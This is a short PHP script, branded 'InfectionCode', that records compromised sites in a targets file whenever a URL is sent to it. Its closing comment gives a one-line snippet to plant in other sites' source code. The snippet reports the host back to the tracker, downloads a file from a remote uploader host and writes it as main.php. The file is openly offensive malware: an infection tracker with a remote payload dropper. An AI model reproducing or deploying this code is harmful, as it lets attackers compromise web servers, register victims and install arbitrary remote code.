<?php
/**
*  _____        __          _   _              _____          _      
* |_   _|      / _|        | | (_)            / ____|        | |     
*   | |  _ __ | |_ ___  ___| |_ _  ___  _ __ | |     ___   __| | ___ 
*   | | | '_ \|  _/ _ \/ __| __| |/ _ \| '_ \| |    / _ \ / _` |/ _ \
*  _| |_| | | | ||  __/ (__| |_| | (_) | | | | |___| (_) | (_| |  __/
* |_____|_| |_|_| \___|\___|\__|_|\___/|_| |_|\_____\___/ \__,_|\___|
*                                                                    
*/
error_reporting(0);
function logname($filename, $item = "", $times = 1){
    $list = array(); $enteries = array();
    $data = @file_get_contents($filename)  ;
    $enteries = explode("\r\n", $data);
    if (!empty($item)) array_unshift($enteries, $item);
    foreach ($enteries as $query){
        $info = explode('|', $query);
        if (!$info[0]) continue;
        if (!$info[1]) $info[1] = $times;
        $list[$info[0]] += $info[1];
        unset($info);
    }
    $enteries = array();
    foreach ($list as $info => $query) {
        $entery = "";
        if ($query > 0)
            $entery = "$info";
        $enteries[] = $entery;
    }
    $data =  @implode("\r\n", $enteries);
    @file_put_contents($filename, $data);
    if (filesize($filename) <= 0);
}
if (!empty($_REQUEST['add'])) {
    logname("targets.txt", $_REQUEST['add']);
    echo $_REQUEST['add']." Client added to the list!<br>";
}
// put the bottom line in your source code
// @file_get_contents("Infection.php?add=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);$u=@file_get_contents("HTTP://Uploader.url");@file_put_contents('main.php',$u);
?>
